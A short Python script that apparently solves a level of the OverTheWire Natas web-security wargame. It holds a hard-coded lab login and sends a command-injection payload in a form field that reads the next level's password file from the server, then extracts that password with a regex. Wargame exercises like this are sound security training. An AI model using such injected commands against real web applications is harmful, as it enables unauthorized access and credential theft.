import requests
import re

username ='natas9'
password ='W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

url = 'http://%s.natas.labs.overthewire.org/' %username

session = requests.Session()
data = {"needle":";cat /etc/natas_webpass/natas10;" , "submit":"submit"}

responce = session.post(url ,data=data, auth = (username, password))
content = responce.text

# print(session.cookies['loggedin'])
print (content)

print ("password for natas10 is = " + re.findall('<pre>\n(.*)\n',content)[0])